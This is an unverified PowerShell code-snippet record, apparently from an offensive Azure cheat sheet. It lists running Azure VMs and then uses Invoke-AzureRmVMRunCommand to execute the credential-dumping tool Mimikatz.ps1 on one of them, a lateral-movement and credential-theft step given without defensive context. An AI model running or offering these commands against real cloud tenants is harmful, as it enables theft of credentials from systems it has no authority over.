---
id: d19a9fea-6326-40ab-8f4e-63c9ba017036
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:15.612314+00:00'
updated_at: '2023-05-25T04:08:11.490933+00:00'
---

# Code Snippet d19a9fea

**Language**: Powershell

```powershell
# List available VMs
PS C:\> Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
ResourceGroupName    Name       
-----------------    ----       
TESTRESOURCES        Remote-Test

# Execute Powershell script on the VM
PS C:\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
```


